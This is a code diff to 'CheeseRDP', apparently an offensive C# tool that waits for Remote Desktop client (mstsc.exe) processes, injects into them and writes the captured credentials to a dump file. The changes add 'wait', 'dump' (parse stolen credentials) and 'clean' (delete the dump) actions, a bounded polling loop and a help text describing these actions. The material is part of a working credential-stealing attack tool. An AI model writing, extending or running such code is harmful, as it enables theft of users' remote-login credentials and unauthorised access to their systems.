@@ -28,11 +28,52 @@ namespace CheeseRDP
             // List of collected credentials
             List<Credential> credentialsList = new List<Credential>();
 
+            int wait_limit= -10;
+            int wait_time = 1000;
+
+            if ((args.Length >= 1) && (args[0] == "help")) {
+                PrintHelp();
+                Environment.Exit(0);
+            }
+            else if ((args.Length >= 1) && (args[0] == "wait"))
+            {
+                wait_limit = 1;
+                wait_time = 3000;
+            }
+
+            else if ((args.Length >= 1) && (args[0] == "dump"))
+            {
+                try
+                {
+                    if (File.Exists(dumpFile))
+                    {
+                        ParseOutput(dumpFile, credentialsList);
+                    }
+                }
+                catch
+                {
+                }
+                Environment.Exit(0);
+            }
+
+            else if ((args.Length >= 1) && (args[0] == "clean"))
+            {
+                try
+                {
+                    if (File.Exists(dumpFile))
+                    {
+                        File.Delete(dumpFile);
+                    }
+                }
+                catch
+                {
+                }
+                Environment.Exit(0);
+            }
+
             Console.WriteLine("[*] Waiting for mstsc.exe...");
 
-            if (File.Exists(dumpFile))
-                File.Delete(dumpFile);
-            while (true)
+            while (wait_limit != 0)
             {
                 // Reset list of PIDs and get processes
                 PIDs.Clear();
@@ -84,9 +125,25 @@ namespace CheeseRDP
                         injectedProcesses.Remove(injectedProcesses[i]);
                     }
                 }
+
                 // Avoid Active Polling
-                Thread.Sleep(3000);
+
+                Thread.Sleep(wait_time);
+                wait_limit++;
             }
+        }
+
+        public static void PrintHelp() {
+
+            Console.Write(@"
+Usage:
+    CheeseRDP [actions]
+Actions:
+    wait: keep listening for any new mstsc.exe process indefinitely (stop with ctrl-C)
+    clean: delete the credentials dump file if present
+    dump: dump the content of the file if present, parsing the credentials in a compact format
+");
+            
         }
 
         public static void ParseOutput(string dumpFile, List<Credential> credentialsList) {
